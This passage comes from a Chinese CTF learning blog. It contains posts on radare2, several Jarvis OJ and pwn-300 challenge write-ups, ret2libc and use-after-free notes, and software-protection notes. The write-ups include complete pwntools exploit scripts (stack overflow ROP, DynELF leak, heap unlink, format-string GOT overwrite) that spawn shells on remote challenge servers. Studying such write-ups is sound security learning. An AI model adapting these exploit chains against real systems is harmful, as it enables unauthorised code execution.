不会主动去分析一个文件，因为这样做的代价太大了，它需要花费很多的时间。也可以在运行 radare2的使用 -A 参数来直接分析一个文件(例如 r2 -A pwnme) 12345678# r2 -A pwnme[x] Analyze all flags starting with sym. and entry0 (aa)[x] Analyze function calls (aac)[x] Analyze len bytes of instructions for references (aar)[x] Constructing a function name for fcn.* and sym.func.* functions (aan)[x] Type matching analysis for all functions (afta)[x] Use -AA or aaaa to perform additional experimental analysis. -- r2OS r2pad 0.1 SMP GENERIC r2_64 GNU/r2OS fs 分析完成之后， r2会将所有有用的信息和特定的名字绑定在一起，比如区段、函数、符号、字符串，这些都被称作 ‘flags’, flags 被整合进 ，一个 flag 是所有类似特征的集合。可以使用 ‘fs ‘ 加 ‘f’ 来打印出 这个 flags 下面包含的信息，使用分号来间隔多条命令(‘cmd1;cmd2;cmd3;…’). 1234567891011[0x08049090]&gt; fs0 2 * strings1 37 * symbols2 30 * sections3 12 * segments4 5 * relocs5 5 * imports6 2 * functions[0x08049090]&gt; fs strings;f0x0804a008 8 str.bin_sh0x0804a010 6 str.input axt 命令用来在 data/code段里找寻某个地址相关的引用（更多的操作，请看 ‘ax?’）.‘@@’就像一个迭代器，用来在地址空间里不断地匹配后面一系列相关的命令（更多操作，请看 ‘@@?’）， ‘str.*’ 是一个通配符，用来标记所有以 ‘str.’开头的信息，这个不光会列出字符串标志，同时也包括函数名，找到它们到底在哪里以及何处被调用。 vv 大概是会显示函数列表和入口处的函数？可以查看各个函数(花里胡哨的，很漂亮哦，不如我们。。) 12345678910111213141516171819202122232425-[ functions ]----------------- pdf ---(a) add (x) xrefs (q) quit (jk) next/prev ;-- section..text:(r) rename (c) calls (g) go (tab) column ;-- eip:(d) delete (v) vars (?) help (:) enter cmd / (fcn) entry0 50&gt;* 0x08049090 50 entry0 | entry0 (); 0x080490c3 4 fcn.080490c3 | 0x08049090 xor ebp, ebp ; [14] -r-x secti 0x08049070 6 sym.imp.__libc_start_main | 0x08049092 pop esi 0x080490f0 40 sym.deregister_tm_clones | 0x08049093 mov ecx, esp 0x08049130 53 sym.register_tm_clones | 0x08049095 and esp, 0xfffffff0 0x08049170 30 sym.__do_global_dtors_aux | 0x08049098 push eax 0x080491a0 2 entry1.init | 0x08049099 push esp 0x080492b0 2 sym.__libc_csu_fini | 0x0804909a push edx 0x080490e0 4 sym.__x86.get_pc_thunk.bx | 0x0804909b call fcn.080490c3 0x080492b4 20 sym._fini | 0x080490a0 add ebx, 0x2f60 ; &apos;`/&apos; 0x08049250 93 sym.__libc_csu_init | 0x080490a6 lea eax, [ebx - 0x2d50] 0x080490d0 2 sym._dl_relocate_static_pie | 0x080490ac push eax ; func fini 0x08049203 65 sym.main | 0x080490ad lea eax, [ebx - 0x2db0] 0x08049244 4 sym.__x86.get_pc_thunk.ax | 0x080490b3 push eax ; func init 0x08049050 6 sym.imp.puts | 0x080490b4 push ecx ; char **ubp_av 0x080491cd 54 sym.vulnerable | 0x080490b5 push esi ; int argc 0x08049040 6 sym.imp.gets | 0x080490b6 mov eax, sym.main ; 0x8049203 0x080491a2 43 sym.flag | 0x080490bc push eax ; func main 0x08049060 6 sym.imp.system \\ 0x080490bd call sym.imp.__libc_start_main ; int __libc_star 0x08049000 35 sym._init 0x08049080 6 sub.__gmon_start_80 s 命令可以跳转到某个地址或者已经有了符号的函 数中去。然后我们使用pdf这个命令可以打印main这个函数的汇编代码。 12345678910111213141516171819202122232425262728293031[0x08049090]&gt; s main[0x08049203]&gt; pdf ;-- main:/ (fcn) sym.main 65| sym.main (int argc, char **argv, char **envp);| ; var int local_8h @ ebp-0x8| ; arg int arg_4h @ esp+0x4| ; DATA XREF from entry0 (0x80490b6)| 0x08049203 8d4c2404 lea ecx, [arg_4h] ; 4| 0x08049207 83e4f0 and esp, 0xfffffff0| 0x0804920a ff71fc push dword [ecx - 4]| 0x0804920d 55 push ebp| 0x0804920e 89e5 mov ebp, esp| 0x08049210 53 push ebx| 0x08049211 51 push ecx| 0x08049212 e82d000000 call sym.__x86.get_pc_thunk.ax| 0x08049217 05e92d0000 add eax, 0x2de9| 0x0804921c 83ec0c sub esp, 0xc| 0x0804921f 8d9010e0ffff lea edx, [eax - 0x1ff0]| 0x08049225 52 push edx ; const char *s| 0x08049226 89c3 mov ebx, eax| 0x08049228 e823feffff call sym.imp.puts ; int puts(const char *s)| 0x0804922d 83c410 add esp, 0x10| 0x08049230 e898ffffff call sym.vulnerable| 0x08049235 b800000000 mov eax, 0| 0x0804923a 8d65f8 lea esp, [local_8h]| 0x0804923d 59 pop ecx| 0x0804923e 5b pop ebx| 0x0804923f 5d pop ebp| 0x08049240 8d61fc lea esp, [ecx - 4]\\ 0x08049243 c3 ret radare2还实现了IDA的类似F5功能，我们可以使用pdc命令来实现。(目前看上去真不怎么样 12345678910111213141516171819202122232425262728293031323334[0x08049203]&gt; pdcfunction sym.main () &#123; // 1 basic blocks loc_0x8049203: //DATA XREF from entry0 (0x80490b6) ecx = [arg_4h] //4 esp &amp;= 0xfffffff0 //ebp push dword [ecx - 4] push ebp ebp = esp push ebx push ecx sym.__x86.get_pc_thunk.ax () eax += 0x2de9 //obj._GLOBAL_OFFSET_TABLE esp -= 0xc edx = [eax - 0x1ff0] //&quot;input&quot; str.input push edx //const char *s ; (pstr 0x0804a010) &quot;input&quot; ebx = eax //obj._GLOBAL_OFFSET_TABLE int puts(const char * s : (*0x804a010)0x00177fe0 = input) esp += 0x10 sym.vulnerable () eax = 0 esp = [local_8h] pop ecx pop ebx //ebp esp = [ecx - 4] //ebp return(break)&#125; 还有框架结构界面，我们可以使用大写的VV命令来到框架结构界面。(很赞 .---------------------------------------------------. | [0x8049203] | | ;-- main: | | ;-- eip: | | (fcn) sym.main 65 | | sym.main (int argc, char **argv, char **envp); | | ; var int local_8h @ ebp-0x8 | | ; arg int arg_4h @ esp+0x4 | | ; DATA XREF from entry0 (0x80490b6) | | ; 4 | | lea ecx, [arg_4h] | | and esp, 0xfffffff0 | | push dword [ecx - 4] | | push ebp | | mov ebp, esp | | push ebx | | push ecx | | call sym.__x86.get_pc_thunk.ax;[ga] | | add eax, 0x2de9 | | sub esp, 0xc | | lea edx, [eax - 0x1ff0] | | ; const char *s | | push edx | | mov ebx, eax | | ; int puts(const char *s) | | call sym.imp.puts;[gb] | | add esp, 0x10 | | call sym.vulnerable;[gc] | | mov eax, 0 | | lea esp, [local_8h] | `---------------------------------------------------&apos; 目前就了解了这一点，参考了一些大佬的文章，之后可以尝试着去使用，仅仅局限于IDA,GDB是不行的。就这样。","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"tech","slug":"tech","permalink":"http://siriuswhiter.tk/tags/tech/"}]},{"title":"Jarvis OJ-pwn","slug":"jarvis-oj-pwn","date":"2018-09-13T06:17:19.000Z","updated":"2018-10-14T07:23:37.905Z","comments":true,"path":"2018/09/13/jarvis-oj-pwn/","link":"","permalink":"http://siriuswhiter.tk/2018/09/13/jarvis-oj-pwn/","excerpt":"","text":"开始漫漫刷题之路 level4 - DynELF题目给的东西很少，基本信息如下： 信息main：123456int __cdecl main(int argc, const char **argv, const char **envp)&#123; vulnerable_function(); write(1, &quot;Hello, World!\\n&quot;, 0xEu); return 0;&#125; vulnerable_function：123456ssize_t vulnerable_function()&#123; char buf; // [esp+0h] [ebp-88h] return read(0, &amp;buf, 0x100u);&#125; 保护：只开启了nx。123456&apos;/root/pwnprac/level4&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 分析read很明显会溢出，溢出到返回地址覆盖为system的地址即可，问题在于其地址的寻找，也就是该题的重点：DynELF。最终思路就是因为可以不断的通过调用write函数来leak函数地址，使用dynelf可以通过泄露的地址确定libc版本来确定system地址。/bin/sh则可以通过调用read来将其写入bss段，调用即可。 poc1234567891011121314151617181920212223242526272829from pwn import *#sh = process(&apos;./level4&apos;)sh = remote(&apos;pwn2.jarvisoj.com&apos;,9880)libc = ELF(&apos;./level4&apos;)bss_add = libc.bss() //直接得到bss段地址def leak(add): //leak函数 pay1 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(libc.symbols[&apos;write&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(1) + p32(add) + p32(4) sh.send(pay1) data = sh.recv(4) return data#神奇DynELF工具使用d = DynELF(leak,elf = ELF(&apos;./level4&apos;)) //初始化DynELF模块 sys_add = d.lookup(&apos;system&apos;,&apos;libc&apos;) //在libc文件中搜索system函数的地址 print hex(sys_add)pay2 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(libc.symbols[&apos;read&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(0) + p32(bss_add) + p32(8) //调用readsh.send(pay2)sh.send(&apos;/bin/sh\\x00&apos;) pay3 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(sys_add) + &apos;dead&apos; + p32(bss_add)sh.send(pay3)sh.interactive() 获得shell1234[*] Switching to interactive mode$ whoamictf$ 参考:借助DynELF实现无libc的漏洞利用小结 level3_x64 - 64位参数传递当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。 搞了一早上感觉思路完全没毛病，但是poc总是不能用，最终与网上的wp调试比对半天才发现在该文档下的libc-2.19.so文件不是该题的配套libc！！！！！应该是之前某个题的。。。心态爆炸重新下载源文件，问题解决。。。 信息：漏洞函数：明显的栈溢出1234567ssize_t vulnerable_function()&#123; char buf; // [rsp+0h] [rbp-80h] write(1, &quot;Input:\\n&quot;, 7uLL); return read(0, &amp;buf, 0x200uLL);&#125; 思路：整体思路与之前相同：泄露write函数got地址，然后通过调用write函数泄露write真实地址，之后system，/bin/sh什么的手到擒来。所以主要就是练习x64下的参数传递。 poc：1234567891011121314151617181920212223242526272829303132from pwn import *#context.log_level = &apos;debug&apos;sh = remote(&apos;pwn2.jarvisoj.com&apos;,9883)#sh = process(&apos;level3&apos;)pwn = ELF(&apos;level3_x64&apos;)libc = ELF(&apos;libc-2.19.so&apos;)pop_rdi_ret = 0x004006b3 #pop rdi ; retpop_rsi_r15_ret = 0x004006b1 #pop rsi ; pop r15 ; retsys_libc_addr = libc.symbols[&apos;system&apos;]binsh_libc_addr = libc.search(&apos;/bin/sh&apos;).next()#----------To get write.got--------------# pay1 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;pay1 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(pwn.got[&apos;write&apos;]) + p64(1) //虽然找不到pop_rdx_ret,但是经调试，rdx值大于8，所以我们可以只接受前八个字符即可。pay1 += p64(pwn.symbols[&apos;write&apos;]) + p64(pwn.symbols[&apos;vulnerable_function&apos;])sh.recvuntil(&quot;Input:\\n&quot;)sh.send(pay1)write_addr = u64(sh.recv(8))#---------call system func---------------#sys_addr = write_addr - libc.symbols[&apos;write&apos;] + sys_libc_addrbinsh_addr = write_addr - libc.symbols[&apos;write&apos;] + binsh_libc_addrpay2 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos; pay2 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)sh.send(pay2)sh.interactive() 获得shell： 123$ whoamictf$ —之后再做— level6 - 堆的unlink利用正常的选项类型题 信息main:12345678910111213141516171819202122232425262728293031323334353637int __cdecl main()&#123; unsigned int v0; // eax alarm_func(); main_ptr(); while ( 1 ) &#123; v0 = menu();LABEL_3: switch ( v0 ) &#123; case 1u: list(); continue; case 2u: add(); continue; case 3u: edit(); continue; case 4u: delete(); v0 = menu(); if ( v0 &gt; 5 ) goto LABEL_6; goto LABEL_3; case 5u: puts(&quot;Bye&quot;); return 0; default:LABEL_6: puts(&quot;Invalid!&quot;); break; &#125; &#125;&#125; 问题函数：delete函数未检查inuse位，可以double free，且free完并未清空指针。 12345678910111213141516171819202122int delete()&#123; int v0; // eax int v1; // edx int v3; // eax if ( *(_DWORD *)(dword_804A2EC + 4) &lt;= 0 ) return puts(&quot;No notes yet.&quot;); printf(&quot;Note number: &quot;); v0 = get_num(); if ( v0 &lt; 0 ) return puts(&quot;Invalid number!&quot;); v1 = dword_804A2EC; if ( v0 &gt;= *(_DWORD *)dword_804A2EC ) return puts(&quot;Invalid number!&quot;); --*(_DWORD *)(dword_804A2EC + 4); v3 = v1 + 12 * v0; *(_DWORD *)(v3 + 8) = 0; *(_DWORD *)(v3 + 12) = 0; free(*(void **)(v3 + 16)); return puts(&quot;Done.&quot;);&#125; 同时add与edit会对输入的大小进行（或许）与0x80的对齐，即向上对齐到0x80,0x100,0x180,0x200这样子。不过只需要输入申请大小的内容即可。 保护：（基本上不用看。。） 123456[*] &apos;/root/pwnprac/freenote_x86&apos; Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 思路(有点迷) 首先分配5个大小为0x80的内存块（0,1,2,3,4），之后按顺序free掉3号与1号（这样1号内存的fd指针会指向3号），这样0号内存块就可以使用1号内存块的pre_size 与size 位，但我们可以edit 0号内存块大小为0x90，目的是为了在对齐机制的情况下，系统会分配0x100大小的内存块，但因为需要输入申请内存大小的内容，所以只要0x90，即刚好覆盖1号内存块的pre_size与size位，此时可以打印出1号内存块的fd指针，从而泄露出堆的基地址与0号内存的地址。 之后unlink，因为delete漏洞的存在，1号块可以double free,将0号块卸下。这样子就可以对0号块为所欲为。(不太懂怎么为所欲为的) poc（待参透）1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495from pwn import *#context.log_level = &apos;debug&apos;context.terminal = [&apos;terminator&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]local = 0if local: cn = process(&quot;./freenote_x86&quot;) bin = ELF(&quot;freenote_x86&quot;) libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)else: cn = remote(&apos;pwn2.jarvisoj.com&apos;,9885) bin = ELF(&quot;freenote_x86&quot;) libc = ELF(&quot;libc-2.19.so&quot;)def list_post(): passdef add_post(length,content): cn.sendline(&apos;2&apos;) cn.recvuntil(&apos;Length&apos;) cn.sendline(str(length)) cn.recvuntil(&apos;Enter&apos;) cn.sendline(content)def edit_post(idx,length,content): cn.sendline(&apos;3&apos;) cn.recvuntil(&apos;number&apos;) cn.sendline(str(idx)) cn.recvuntil(&apos;Length&apos;) cn.sendline(str(length)) cn.recvuntil(&apos;Enter&apos;) cn.sendline(content)def del_post(idx): cn.sendline(&apos;4&apos;) cn.recvuntil(&apos;number&apos;) cn.sendline(str(idx))#chunk_list=0x0804A2EC#test=0x08048CC5#-------init-------for i in range(5): add_post(0x80,str(i)*0x80)del_post(3)del_post(1)pay = &apos;0&apos;*0x80 + &apos;a&apos;*0x8edit_post(0,0x88,pay)#------------------#--------leak----------cn.sendline(&apos;1&apos;)cn.recvuntil(&apos;a&apos;*0x8)leak_addr = u32(cn.recv(4))cn.recv()heap_base = leak_addr - 0xdb0#offsetchunk0_addr = heap_base + 0x18success(&quot;leak_addr: &quot;+hex(leak_addr))success(&quot;heap_base: &quot;+hex(heap_base))success(&quot;chunk0_addr: &quot;+hex(chunk0_addr))#----------------------#-------unlink--------pay = p32(0x88) + p32(0x80) + p32(chunk0_addr-0xc) + p32(chunk0_addr-0x8) + &apos;0&apos;*(0x80-4*4)pay += p32(0x80) + p32(0x88+0x88)edit_post(0,len(pay),pay)del_post(1)#----------------------#--------leak----------pay = p32(2) + p32(1) + p32(0x88) + p32(chunk0_addr-0xc)pay += p32(1)+p32(0x4)+p32(bin.got[&apos;strtol&apos;])pay += &apos;\\x00&apos;*(0x88-len(pay))edit_post(0,len(pay),pay)cn.sendline(&apos;1&apos;)cn.recvuntil(&apos;0. &apos;)cn.recvuntil(&apos;1. &apos;)strtol = cn.recvuntil(&apos;\\x0a&apos;)[:-1]cn.recv()strtol = u32(strtol)system = strtol - libc.symbols[&apos;strtol&apos;]+libc.symbols[&apos;system&apos;]success(&quot;strtol: &quot;+hex(strtol))success(&quot;system: &quot;+hex(system))#----------------------#--------hijack&amp;getshell--------edit_post(1,4,p32(system))cn.sendline(&quot;$0&quot;)#----------------------cn.interactive() 获得shell 123Your choice: $ whoamictf$","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"pwn-300-Formatting string vulnerability","slug":"pwn-300解析-格式化字符串漏洞利用巩固","date":"2018-09-11T01:51:39.000Z","updated":"2018-09-25T13:44:41.876Z","comments":true,"path":"2018/09/11/pwn-300解析-格式化字符串漏洞利用巩固/","link":"","permalink":"http://siriuswhiter.tk/2018/09/11/pwn-300解析-格式化字符串漏洞利用巩固/","excerpt":"","text":"pwn-300之前有一道pwn-200，也具有canary保护及NX保护，但是直接给了system(‘/bin/sh’)的函数，所以问题的关键就在于如何使程序转向该函数地址执行；幸运的是该程序同时具有格式化字符串漏洞。所以最后的思路就是，第一次输入，格式化字符串漏洞泄露canary，第二次输入溢出到函数返回地址即可。而这道题将输入由gets变为fgets，也就是即使泄露出canary也无法溢出利用（canary必定以/x00结尾），同时没有了现成的system(‘/bin/sh’)函数。 查看内容及保护main函数为：1234567891011121314int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s; // [esp+Ch] [ebp-4Ch] unsigned int v5; // [esp+4Ch] [ebp-Ch] v5 = __readgsdword(0x14u); //canary生成 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); fgets(&amp;s, 64, stdin); //fgets,遇/x00停止 printf(&amp;s); //格式化字符串漏洞 fgets(&amp;s, 64, stdin); printf(&amp;s); return 0;&#125; 查看文件保护仍然是canary 与 栈不可执行； 1234567root@xuewenjie-kali:~/tikool# checksec binary_300[*] &apos;/root/tikool/binary_300&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 查看加载函数发现system函数 加载函数 确定思路想到可以使用格式化字符串覆盖某个函数的got表地址，看下程序流程，想到可以覆盖printf函数的got地址，在第二次输入’/bin/sh’，原先的printf(/bin/sh)就会变成system(/bin/sh)，获取shell； 流程实现确定字符串位置123root@xuewenjie-kali:~/tikool# ./binary_300aaaa%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x aaaa00000040.f7f285c0.00000000.00000000.00000000.00000000.61616161.78383025.3830252e 即字符串位于第六（相对于）或第七个（相对于） exp如下： 1234567891011121314151617from pwn import *#sh = process(&apos;./binary_300&apos;)sh = remote(&apos;bamboofox.cs.nctu.edu.tw&apos;,22003)libc = ELF(&apos;./binary_300&apos;)printf_got = libc.got[&apos;printf&apos;]system_add = libc.symbols[&apos;system&apos;]payload = fmtstr_payload(7, &#123;printf_got: system_add&#125;) //pwntools自带，用于生成格式化字符串payload；print payloadsh.sendline(payload)sh.recv()sh.sendline(&apos;/bin/sh&apos;)sh.interactive() 成功获得shell12345[*] Switching to interactive mode$ /bin/sh$ whoamictf$","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"format","slug":"format","permalink":"http://siriuswhiter.tk/tags/format/"}]},{"title":"Introduction to pwn 1.3--plt/got","slug":"pwn-入门1-3-plt-got","date":"2018-08-28T04:12:56.000Z","updated":"2018-09-26T13:16:43.727Z","comments":true,"path":"2018/08/28/pwn-入门1-3-plt-got/","link":"","permalink":"http://siriuswhiter.tk/2018/08/28/pwn-入门1-3-plt-got/","excerpt":"","text":"&lt;center&gt;关于ret2libc 中的plt/got&lt;/center&gt; 延迟绑定即当第一次使用某函数时，GOT表中对应表项保存的并不是真实的函数地址，需要通过_dl_runtime_resolve查找到真实的函数地址并填入GOT对应表项，从而在下次再使用该函数时，无需进行查找。我们要泄漏的就是初始化查找后填入GOT对应表项中的函数地址。 使用gdb，断点下在write函数之后，运行，x查看write.plt.got处的值，即实际地址；* plt 与 got文件的plt表中存放着函数的.plt.got 地址，.plt.got 地址处的值为该函数的真正的got地址（也就是我们需要泄露的） 由于延迟绑定机制的存在，我们只能通过泄露被调用的函数的got地址，同时又因为同一libc库中各函数之间的偏移是固定的，我们就能因此来求出其他函数的got地址。 ret2libc的实现 文件给了一个pwnme文件与libc-2.19.so文件；checksec查看文件保护，IDA 查看源码，可以看到buf大小只有0x8，read却允许读入0x100大小的数据，有着明显的栈溢出； 图一](pwn-入门1-3-plt-got/checksec.png) ![图二 查看应用调用函数plt表，objdump -d -M intel -j .plt pwnme可以看到没有调用system，需要我们利用其它已调用的来泄露； 图三 这里决定泄露write函数的got地址：使用pwntools，使程序运行完write函数，得到真实的got地址； 123pwn = ELF(&apos;pwnme&apos;) sh.recvuntil(&apos;flag:&apos;) wri_got = pwn.got[&apos;write&apos;] 构造payload泄露write函数的实际地址 1pay = &apos;a&apos;*20 + p32(pwn.symbols[&apos;write&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(1) + p32(wri_got) + p32(4) 泄露libc中的system与/bin/sh地址 123libc = ELF(&apos;libc-2.19.so&apos;)sys_addr = wri_addr - libc.symbols[&apos;write&apos;] + libc.symbols[&apos;system&apos;]binsh_addr = wri_addr - libc.symbols[&apos;write&apos;] + libc.search(&apos;/bin/sh&apos;).next() 构造payload 1payload = &apos;a&apos;*20 + p32(sys_addr) + &apos;bbbb&apos; + p32(binsh_addr) 因为某些不知名的原因，各个偏移得到的got地址并不是特别对，所以先不放wp。之后再补","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"}]},{"title":"Introduction to pwn2.2--UAF","slug":"pwn-入门n-n","date":"2018-08-28T03:10:56.000Z","updated":"2018-09-25T13:46:12.344Z","comments":true,"path":"2018/08/28/pwn-入门n-n/","link":"","permalink":"http://siriuswhiter.tk/2018/08/28/pwn-入门n-n/","excerpt":"","text":"堆的UAF(use after free)利用学长介绍了某CTF大佬聚集的交流群，但是入群需要做题，题目本来不是我这个段位可以搞定的，但是怎么说？有压力就有动力:)抱着入群的信念，先看了misc，结果需要修复pyc文件，按流程走的时候出现了无法解决的一个奇怪问题，遂放弃；之后看了下pwn，感觉甚难；在看了逆向完全不会之后，只能看了下pwn的tips，开始现学现卖。 原理就像它的名字一样，即一个内存块被释放后再次被使用；主要利用的是一个指针对应的内存块被释放后，对应的指针没有被设为NULL；而如果在这个指针在下一次被使用之前对应的内存块仍未被修改，程序可能还会正常运转；而若被已经修改，则有可能被利用，UAF就是利用该漏洞。 根本原因：应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。 漏洞的简单利用1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef void (*func_ptr)(char *);void evil_fuc(char command[])&#123;system(command);&#125;void echo(char content[])&#123;printf(&quot;%s&quot;,content);&#125;int main()&#123; func_ptr *p1=(func_ptr*)malloc(4*sizeof(int)); printf(&quot;malloc addr: %p\\n&quot;,p1); p1[3]=echo; p1[3](&quot;hello world\\n&quot;); free(p1); //在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针 p1[3](&quot;hello again\\n&quot;); //p1指针未被置空,虽然free了,但仍可使用.只是其内存块是被标记为空闲状态 func_ptr *p2=(func_ptr*)malloc(4*sizeof(int));//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来. printf(&quot;malloc addr: %p\\n&quot;,p2); printf(&quot;malloc addr: %p\\n&quot;,p1);//p2与p1指针指向的内存为同一地址 p2[3]=evil_fuc; //在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针. p1[3](&quot;/bin/sh&quot;); return 0;&#125; 最终运行效果： result 漏洞的利用方法原理上与其相同，之后会再加上入群题的解题过程 学习借鉴文章来源：https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"Introduction to pwn1.2--ret2libc","slug":"pwn-入门1-2","date":"2018-08-28T01:46:58.000Z","updated":"2018-09-25T13:46:32.048Z","comments":true,"path":"2018/08/28/pwn-入门1-2/","link":"","permalink":"http://siriuswhiter.tk/2018/08/28/pwn-入门1-2/","excerpt":"","text":"ret2libc学习 ret2libc使用原因程序不是静态编译，通常就不会有int 0x80sret2syscall 就无法实现，因而使用 ret2library。 调用函数的栈结构布局 ： 调用函数的返回地址 函数调用完的返回地址 调用函数的参数1 调用函数的参数2 利用过程分析：ASLR使得每次载入的函数地址（base）都不同 实际地址 Address = base +offset 若地址为 0xf… 则其为实际地址； offset在libc库中是固定的； 查看libc库版本： 12ldd ./file 寻找偏移地址 ： 1readelf -a /lib32/libc.so.6 | grep gets@ 目标是寻找libc 的 base : 1.通过程序中的其他函数leak 程序libc的实际地址（Address）,base = Address - offset 2.从stack残渣中获取libc地址信息 延迟绑定（没搞清楚，之后再写）函数调用方式： call func@plt –&gt; .got.plt –&gt;.got.plt的值为该func的实际地址（所需address） 使用调用函数的栈结构布局：1. 123456789101112gets()pop1_ret(pop&lt;buf&gt; 然后 return）&lt;buf&gt;system()xxx&lt;buf&gt; 2. 12345678gets()system()&lt;buf&gt;&lt;buf&gt;","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"}]},{"title":"软件保护/软件破解 及对抗","slug":"软件保护-软件破解-及对抗","date":"2018-08-25T01:30:41.000Z","updated":"2018-09-26T12:34:49.108Z","comments":true,"path":"2018/08/25/软件保护-软件破解-及对抗/","link":"","permalink":"http://siriuswhiter.tk/2018/08/25/软件保护-软件破解-及对抗/","excerpt":"","text":"软件保护简单算法注册保护：输入用户名序列号，计算并检测序列号； 简单算法注册保护的对抗：①修改关键指令：暴力破解；patcher②dll注入或使用加载器（使序列号计算结果展示出来）；内存注册机③还原本身算法；keygen 复杂算法注册保护：通常内置rsa公钥/签名/绑定硬件码/注册信息分段校验/运行时校验等； 复杂算法注册保护的对抗：①patch②补丁修改公钥，使用自己的公钥对； 网络加密及硬件加密：本质上与本地加密相同/运行前检测？？ 网络加密及硬件加密的对抗：①patch②模拟与远程端的通信，及模拟执行；③使用中转程序，从服务器获得远程执行结果； 复杂系统注册保护：以上内容混杂 附：常用–壳（压缩壳/加密壳）：程序运行前的检测，校验/程序注册机制/程序运行二次检测 软件破解及对抗程序分析及对抗： 代码变形mutation； 代码膨胀expansion； 花指令； 代码乱序； 平坦化； 程序调试及对抗： 系统API检测程序是否处于被调试状态； 检测调试器窗口信息、状态码； 检测调试器驱动，符号； 程序执行行为检测（如检测运行时间，时间较长则处于被调试状态）； 利用驱动接管本身程序的中断，阻止被调试器接管； 利用驱动修改内核参数，阻止程序被调试； 双进程反调试； 程序修改及对抗：修改：文件补丁技术及工具；对抗修改： hash校验/内存关键部分CRC校验/ipk劫持等； dnspy：.NET程序逆向工具","categories":[{"name":"RE","slug":"re","permalink":"http://siriuswhiter.tk/categories/re/"}],"tags":[{"name":"RE","slug":"re","permalink":"http://siriuswhiter.tk/tags/re/"}]},{"title":"Hexo Essay Writing","slug":"hexo-essay-writing","date":"2018-08-15T15:33:24.000Z","updated":"2018-09-25T13:46:42.016Z","comments":true,"path":"2018/08/15/hexo-essay-writing/","link":"","permalink":"http://siriuswhiter.tk/2018/08/15/hexo-essay-writing/","excerpt":"","text":"打开git,进入MyBlog目录； 输入 hexo new &quot;essay-name&quot;； 打开source文件夹，找到 essay-name.md，使用markdown语法写作； 执行命令 / hexo clean / hexo generate/ hexo deploy； over； 假如hexo命令出现问题，基本上就是_config.yml 文件的空格有问题，看报错就好了。","categories":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/categories/skills/"}],"tags":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/tags/skills/"}]},{"title":"Markdown standard","slug":"markdown规范学习","date":"2018-08-13T14:46:46.000Z","updated":"2018-09-25T13:48:48.888Z","comments":true,"path":"2018/08/13/markdown规范学习/","link":"","permalink":"http://siriuswhiter.tk/2018/08/13/markdown规范学习/","excerpt":"","text":"MarkDown v1.01.1 全局规范 MarkDown 文件使用‘.md’结尾 （小写字母) 